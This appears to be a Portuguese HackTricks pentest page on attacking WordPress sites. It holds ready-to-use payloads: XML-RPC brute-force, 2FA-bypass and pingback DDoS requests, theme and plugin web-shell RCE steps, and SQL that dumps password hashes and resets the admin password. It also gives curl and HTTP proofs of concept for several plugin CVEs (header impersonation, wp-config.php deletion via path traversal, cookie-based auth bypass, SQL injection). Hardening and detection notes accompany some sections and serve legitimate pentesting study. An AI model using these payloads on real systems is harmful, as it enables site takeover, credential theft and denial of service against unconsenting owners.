# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informações Básicas

- **Arquivos enviados** vão para: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Arquivos de temas podem ser encontrados em /wp-content/themes/,** então se você alterar algum php do tema para obter RCE provavelmente usará esse caminho. Por exemplo: Usando **tema twentytwelve** você pode **acessar** o arquivo **404.php** em: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Outra URL útil pode ser:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- No **wp-config.php** você pode encontrar a senha root do banco de dados.
- Caminhos de login padrão para verificar: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Principais Arquivos do WordPress**

- `index.php`
- `license.txt` contém informações úteis, como a versão do WordPress instalada.
- `wp-activate.php` é usado para o processo de ativação por e-mail ao configurar um novo site WordPress.
- Pastas de login (podem ser renomeadas para ocultá-las):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` é um arquivo que representa um recurso do WordPress que permite que dados sejam transmitidos com HTTP atuando como mecanismo de transporte e XML como mecanismo de codificação. Esse tipo de comunicação foi substituído pelo WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- A pasta `wp-content` é o diretório principal onde plugins e temas são armazenados.
- `wp-content/uploads/` é o diretório onde quaisquer arquivos enviados para a plataforma são armazenados.
- `wp-includes/` é o diretório onde os arquivos core são armazenados, como certificados, fontes, arquivos JavaScript e widgets.
- `wp-sitemap.xml` Em versões do WordPress 5.5 e superiores, WordPress gera um arquivo sitemap XML com todas as postagens públicas e tipos de post e taxonomias consultáveis publicamente.

**Pós-exploração**

- O arquivo `wp-config.php` contém informações necessárias pelo WordPress para conectar-se ao banco de dados, como nome do banco, host, usuário e senha, chaves de autenticação e salts, e o prefixo das tabelas do banco. Esse arquivo de configuração também pode ser usado para ativar o modo DEBUG, o que pode ser útil na resolução de problemas.

### Permissões de Usuários

- **Administrator**
- **Editor**: Publica e gerencia seus e outros posts
- **Author**: Publica e gerencia seus próprios posts
- **Contributor**: Escreve e gerencia seus posts, mas não pode publicá-los
- **Subscriber**: Visualiza posts e edita seu perfil

## **Enumeração Passiva**

### **Obter versão do WordPress**

Verifique se consegue encontrar os arquivos `/license.txt` ou `/readme.html`

Dentro do **código-fonte** da página (exemplo de [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- arquivos de link CSS

![](<../../images/image (533).png>)

- arquivos JavaScript

![](<../../images/image (524).png>)

### Obter Plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Obter Temas
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extrair versões em geral
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Enumeração ativa

### Plugins e Temas

Você provavelmente não conseguirá encontrar todos os Plugins e Temas possíveis. Para descobrir todos eles, você precisará **ativamente Brute Force uma lista de Plugins e Temas** (esperançosamente para nós existem ferramentas automatizadas que contêm essas listas).

### Usuários

- **ID Brute:** Você obtém usuários válidos de um site WordPress por Brute Forcing os IDs de usuário:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Se as respostas forem **200** ou **30X**, isso significa que o id é **válido**. Se a resposta for **400**, então o id é **inválido**.

- **wp-json:** Você também pode tentar obter informações sobre os usuários consultando:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Outro endpoint `/wp-json/` que pode revelar algumas informações sobre usuários é:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Observe que este endpoint expõe apenas usuários que fizeram um post. **Somente informações sobre os usuários que têm este recurso ativado serão fornecidas**.

Também note que **/wp-json/wp/v2/pages** pode leak endereços IP.

- **Login username enumeration**: Ao fazer login em **`/wp-login.php`**, a **mensagem** é **diferente**, indicando se o **username** existe ou não.

### XML-RPC

Se `xml-rpc.php` estiver ativo, você pode realizar um credentials brute-force ou usá-lo para lançar ataques DoS contra outros recursos. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Para verificar se está ativo, tente acessar _**/xmlrpc.php**_ e envie esta requisição:

**Verificar**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`** são alguns dos métodos que podem ser usados para brute-force credentials. Se você conseguir encontrar qualquer um deles, pode enviar algo como:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
A mensagem _"Incorrect username or password"_ dentro de uma resposta com código 200 deve aparecer se as credenciais não forem válidas.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Usando as credenciais corretas você pode enviar um arquivo. Na resposta o caminho aparecerá ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Este método é feito para programas e não para humanos, e é antigo, portanto não suporta 2FA. Então, se você tem credenciais válidas mas a entrada principal está protegida por 2FA, **você pode conseguir abusar do xmlrpc.php para fazer login com essas credenciais contornando a 2FA**. Note que você não conseguirá executar todas as ações que pode fazer através do console, mas ainda assim pode chegar a RCE como o Ippsec explica em [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Se você obter **faultCode** com um valor **maior** que **0** (17), isso significa que a porta está aberta.

Veja o uso de **`system.multicall`** na seção anterior para aprender como abusar deste método para causar DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Este arquivo geralmente existe na raiz do site Wordpress: **`/wp-cron.php`**\
Quando este arquivo é **acessado** uma consulta MySQL **"pesada"** é executada, então ele pode ser usado por **atacantes** para **causar** um **DoS**.\
Além disso, por padrão, o `wp-cron.php` é chamado a cada carregamento de página (sempre que um cliente solicita qualquer página do Wordpress), o que em sites de alto tráfego pode causar problemas (DoS).

Recomenda-se desabilitar o Wp-Cron e criar um cronjob real no host que execute as ações necessárias em intervalos regulares (sem causar problemas).

### /wp-json/oembed/1.0/proxy - SSRF

Tente acessar _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ e o site Worpress pode fazer uma requisição para você.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Esta ferramenta verifica se existe **methodName: pingback.ping** e o path **/wp-json/oembed/1.0/proxy** e, se existir, tenta explorá-los.

## Ferramentas Automáticas
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obter acesso sobrescrevendo um bit

Mais do que um ataque real, isto é uma curiosidade. No CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) você podia inverter 1 bit de qualquer arquivo wordpress. Assim, você poderia inverter a posição `5389` do arquivo `/var/www/html/wp-includes/user.php` para fazer NOP na operação NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modifying a php from the theme used (admin credentials needed)**

Appearance → Theme Editor → 404 Template (à direita)

Change the content for a php shell:

![](<../../images/image (384).png>)

Search in internet how can you access that updated page. In this case you have to access here: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

You can use:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
para obter uma sessão.

## Plugin RCE

### PHP plugin

Pode ser possível fazer upload de arquivos .php como um plugin.\
Crie seu php backdoor usando por exemplo:

![](<../../images/image (183).png>)

Then add a new plugin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Provavelmente isso aparentemente não fará nada, mas se você for em Media, verá seu shell enviado:

![](<../../images/image (462).png>)

Acesse-o e você verá a URL para executar o reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Este método envolve a instalação de um plugin malicioso conhecido por ser vulnerável e que pode ser explorado para obter um web shell. Esse processo é realizado através do WordPress dashboard da seguinte forma:

1. **Plugin Acquisition**: O plugin é obtido de uma fonte como Exploit DB como [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Navegue até o WordPress dashboard, então vá para `Dashboard > Plugins > Upload Plugin`.
- Faça upload do arquivo zip do plugin baixado.
3. **Plugin Activation**: Uma vez que o plugin seja instalado com sucesso, ele deve ser ativado através do dashboard.
4. **Exploitation**:
- Com o plugin "reflex-gallery" instalado e ativado, ele pode ser explorado pois é conhecido por ser vulnerável.
- O Metasploit framework fornece um exploit para essa vulnerabilidade. Ao carregar o módulo apropriado e executar comandos específicos, uma sessão meterpreter pode ser estabelecida, concedendo acesso não autorizado ao site.
- Observa-se que este é apenas um dos muitos métodos para explorar um site WordPress.

O conteúdo inclui auxílios visuais que descrevem os passos no WordPress dashboard para instalar e ativar o plugin. No entanto, é importante notar que explorar vulnerabilidades dessa forma é ilegal e antiético sem autorização adequada. Essas informações devem ser usadas de forma responsável e somente em um contexto legal, como testes de penetração (pentesting) com permissão explícita.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ é um script projetado para escalar uma vulnerabilidade de **Cross-Site Scripting (XSS)** para **Remote Code Execution (RCE)** ou outras vulnerabilidades críticas no WordPress. Para mais informações ver [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Ele fornece **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Cria um user no WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Faça upload do seu custom plugin (backdoor) para o WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edita plugins Built-In no WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edita temas Built-In no WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits para Third-Party WordPress Plugins/Themes.

## Post Exploitation

Extrair usernames e passwords:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Alterar a senha do administrador:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Superfície de Ataque

Saber como um plugin do Wordpress pode expor funcionalidades é fundamental para encontrar vulnerabilidades nessas funcionalidades. Você pode ver como um plugin pode expor funcionalidades nos pontos a seguir e alguns exemplos de plugins vulneráveis em [**este post do blog**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Uma das formas pelas quais um plugin pode expor funções aos usuários é via handlers AJAX. Esses handlers podem conter bugs de lógica, autorização ou autenticação. Além disso, é bastante frequente que essas funções baseiem tanto a autenticação quanto a autorização na existência de um nonce do Wordpress que **qualquer usuário autenticado na instância Wordpress pode ter** (independentemente do seu papel).

Estas são as funções que podem ser usadas para expor uma função em um plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**O uso de `nopriv` torna o endpoint acessível por qualquer usuário (até mesmo não autenticados).**

> [!CAUTION]
> Além disso, se a função estiver apenas verificando a autorização do usuário com a função `wp_verify_nonce`, essa função apenas verifica se o usuário está logado; normalmente ela não verifica o papel do usuário. Assim, usuários com privilégios baixos podem ter acesso a ações de alto privilégio.

- **REST API**

Também é possível expor funções do wordpress registrando uma REST API usando a função `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` é uma callback para função que verifica se um dado usuário está autorizado a chamar o método da API.

**Se a função built-in `__return_true` for usada, ela simplesmente pulará a verificação de permissões do usuário.**

- **Acesso direto ao arquivo php**

Claro, Wordpress usa PHP e arquivos dentro de plugins são diretamente acessíveis pela web. Então, caso um plugin exponha qualquer funcionalidade vulnerável que seja acionada apenas acessando o arquivo, ela será explorável por qualquer usuário.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Alguns plugins implementam atalhos de “trusted header” para integrações internas ou reverse proxies e então usam esse header para definir o contexto do usuário atual para requisições REST. Se o header não estiver vinculado criptograficamente à requisição por um componente upstream, um atacante pode forjá-lo e atingir rotas REST privilegiadas como administrador.

- Impacto: escalonamento de privilégios não autenticado para admin ao criar um novo administrador via a rota REST core users.
- Exemplo de header: `X-Wcpay-Platform-Checkout-User: 1` (força o user ID 1, tipicamente a primeira conta de administrador).
- Rota explorada: `POST /wp-json/wp/v2/users` com um array de role elevado.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Por que funciona

- O plugin mapeia um cabeçalho controlado pelo cliente para o estado de autenticação e pula as verificações de capability.
- O core do WordPress espera a capability `create_users` para esta rota; o hack do plugin a contorna definindo diretamente o contexto do usuário atual a partir do cabeçalho.

Indicadores de sucesso esperados

- HTTP 201 com um corpo JSON descrevendo o usuário criado.
- Um novo usuário administrador visível em `wp-admin/users.php`.

Lista de verificação de detecção

- Procurar por `getallheaders()`, `$_SERVER['HTTP_...']`, ou SDKs de fornecedores que leem cabeçalhos personalizados para definir o contexto do usuário (por exemplo, `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revisar registros de REST para callbacks privilegiados que não possuem verificações robustas de `permission_callback` e, em vez disso, dependem dos cabeçalhos da requisição.
- Procurar por usos das funções core de gerenciamento de usuários (`wp_insert_user`, `wp_create_user`) dentro de manipuladores REST que são protegidos apenas por valores de cabeçalho.

Endurecimento

- Nunca derive autenticação ou autorização a partir de cabeçalhos controlados pelo cliente.
- Se um reverse proxy precisar injetar identidade, termine a confiança no proxy e remova cópias recebidas (por exemplo, `unset X-Wcpay-Platform-Checkout-User` na borda), então passe um token assinado e verifique-o server-side.
- Para rotas REST que executam ações privilegiadas, exija verificações `current_user_can()` e um `permission_callback` estrito (NÃO use `__return_true`).
- Prefira autenticação de primeira parte (cookies, application passwords, OAuth) em vez de “impersonation” via cabeçalhos.

Referências: veja os links no final desta página para um caso público e uma análise mais ampla.

### Exclusão arbitrária de arquivos sem autenticação via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

O tema multipropósito Litho (< 3.1) esqueceu esses 3 controles na *Remove Font Family* feature e acabou distribuindo o seguinte código (simplificado):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
- **Acesso não autenticado** – the `wp_ajax_nopriv_` hook is registered.
- **No nonce / capability check** – qualquer visitante pode acessar o endpoint.
- **Sem sanitização de caminho** – a string controlada pelo usuário `fontfamily` é concatenada a um caminho do sistema de arquivos sem filtragem, permitindo o clássico traversal `../../`.

#### Exploração

Um atacante pode deletar qualquer arquivo ou diretório **abaixo do diretório base de uploads** (normalmente `<wp-root>/wp-content/uploads/`) enviando uma única requisição HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### Checklist de detecção

* Qualquer callback `add_action( 'wp_ajax_nopriv_...')` que chame helpers de sistema de arquivos (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatenação de entrada de usuário não sanitizada em caminhos (procure por `$_POST`, `$_GET`, `$_REQUEST`).
* Ausência de `check_ajax_referer()` e `current_user_can()`/`is_user_logged_in()`.

#### Endurecimento
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Sempre** trate qualquer operação de escrita/remoção no disco como privilegiada e verifique duas vezes:
> • Authentication  • Authorisation  • Nonce  • Input sanitisation  • Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Muitos plugins implementam uma funcionalidade "view as role" ou troca temporária de role salvando o(s) role(s) original(is) em user meta para que possam ser restaurados depois. Se o caminho de restauração depender apenas de request parameters (por exemplo, `$_REQUEST['reset-for']`) e de uma lista mantida pelo plugin sem verificar capabilities e um nonce válido, isso pode se tornar uma vertical privilege escalation.

Um exemplo real foi encontrado no plugin Admin and Site Enhancements (ASE) (≤ 7.6.2.1). O branch de reset restaurava roles baseado em `reset-for=<username>` se o username aparecesse em um array interno `$options['viewing_admin_as_role_are']`, mas não executava nem uma checagem `current_user_can()` nem uma verificação de nonce antes de remover os roles atuais e re-adicionar os roles salvos em user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Por que é explorável

- Confia em `$_REQUEST['reset-for']` e em uma opção do plugin sem autorização no servidor.
- Se um usuário anteriormente teve privilégios mais altos salvos em `_asenha_view_admin_as_original_roles` e foi rebaixado, ele pode restaurá-los acessando o caminho de reset.
- Em algumas implantações, qualquer usuário autenticado poderia acionar um reset para outro nome de usuário ainda presente em `viewing_admin_as_role_are` (autorização quebrada).

Pré-requisitos do ataque

- Versão vulnerável do plugin com o recurso habilitado.
- A conta alvo tem um papel de alto privilégio antigo armazenado em user meta por uso anterior.
- Qualquer sessão autenticada; falta de nonce/capability no fluxo de reset.

Exploração (exemplo)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Em instalações vulneráveis isto remove as funções atuais e readiciona as funções originais salvas (por exemplo, `administrator`), efetivamente escalando privilégios.

Detection checklist

- Procure por recursos de troca de função que persistam as “funções originais” em meta do usuário (por exemplo, `_asenha_view_admin_as_original_roles`).
- Identifique caminhos de redefinição/restauração que:
- Leia nomes de usuário de `$_REQUEST` / `$_GET` / `$_POST`.
- Modifique funções via `add_role()` / `remove_role()` sem `current_user_can()` e `wp_verify_nonce()` / `check_admin_referer()`.
- Autorize com base em um array de opção do plugin (por exemplo, `viewing_admin_as_role_are`) em vez das capacidades do ator.

Hardening

- Enforce capability checks on every state-changing branch (e.g., `current_user_can('manage_options')` or stricter).
- Exija nonces para todas as mutações de função/permissão e verifique-os: `check_admin_referer()` / `wp_verify_nonce()`.
- Nunca confie em nomes de usuário fornecidos pela requisição; resolva o usuário alvo no servidor com base no ator autenticado e em política explícita.
- Invalide o estado de “funções originais” em atualizações de perfil/função para evitar restauração de privilégios elevados obsoletos:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Considere armazenar estado mínimo e usar tokens com tempo limitado e protegidos por capability para trocas de papel temporárias.

---

### Escalada de privilégios não autenticada via troca de usuário confiando em cookie no init público (Service Finder “sf-booking”)

Alguns plugins conectam helpers de troca de usuário ao hook público `init` e derivam a identidade de um cookie controlado pelo cliente. Se o código chama `wp_set_auth_cookie()` sem verificar autenticação, capability e um nonce válido, qualquer visitante não autenticado pode forçar o login como um ID de usuário arbitrário.

Padrão vulnerável típico (simplificado do Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Por que é explorável

- O hook público `init` torna o handler acessível por usuários não autenticados (sem a verificação `is_user_logged_in()`).
- A identidade é derivada de um cookie modificável pelo cliente (`original_user_id`).
- Chamada direta para `wp_set_auth_cookie($uid)` autentica o requisitante como esse usuário sem quaisquer verificações de capability/nonce.

Exploitation (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Considerações de WAF para WordPress/plugin CVEs

WAFs genéricos de borda/servidor são ajustados para padrões amplos (SQLi, XSS, LFI). Muitas falhas de alto impacto em WordPress/plugins são bugs de lógica/auth específicos da aplicação que parecem tráfego benigno, a menos que o motor entenda as rotas do WordPress e a semântica dos plugins.

Notas ofensivas

- Aponte para endpoints específicos do plugin com payloads limpos: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Teste primeiro caminhos sem autenticação (AJAX `nopriv`, REST com permissive `permission_callback`, shortcodes públicos). Payloads padrão frequentemente têm sucesso sem ofuscação.
- Casos típicos de alto impacto: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Notas defensivas

- Não confie em assinaturas genéricas de WAF para proteger plugin CVEs. Implemente virtual patches específicos por vulnerabilidade na camada de aplicação ou atualize rapidamente.
- Prefira verificações de positive-security no código (capabilities, nonces, validação estrita de entrada) em vez de filtros regex negativos.

## Proteção do WordPress

### Atualizações regulares

Certifique-se de que WordPress, plugins e temas estejam atualizados. Confirme também que a atualização automática está habilitada em wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Além disso, **apenas instale plugins e temas confiáveis do WordPress**.

### Plugins de Segurança

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Outras Recomendações**

- Remova o usuário padrão **admin**
- Use **senhas fortes** e **2FA**
- Periodicamente **revise** as **permissões** dos usuários
- **Limite tentativas de login** para prevenir ataques de Brute Force
- Renomeie o arquivo **`wp-admin.php`** e permita acesso apenas internamente ou a partir de certos endereços IP.


### Injeção SQL não autenticada via validação insuficiente (WP Job Portal <= 2.3.2)

O plugin de recrutamento WP Job Portal expôs uma tarefa **savecategory** que, em última instância, executa o seguinte código vulnerável dentro de `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemas introduzidos por este trecho:

1. **Unsanitised user input** – `parentid` vem diretamente da requisição HTTP.
2. **String concatenation inside the WHERE clause** – sem `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** – embora a ação seja executada através de `admin-post.php`, a única verificação presente é um **CSRF nonce** (`wp_verify_nonce()`), que qualquer visitante pode recuperar de uma página pública que incorpora o shortcode `[wpjobportal_my_resumes]`.

#### Exploração

1. Obtenha um nonce novo:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injete SQL arbitrário explorando `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
A resposta revela o resultado da query injetada ou altera o banco de dados, comprovando SQLi.


### Download Arbitrário de Arquivos sem Autenticação / Path Traversal (WP Job Portal <= 2.3.2)

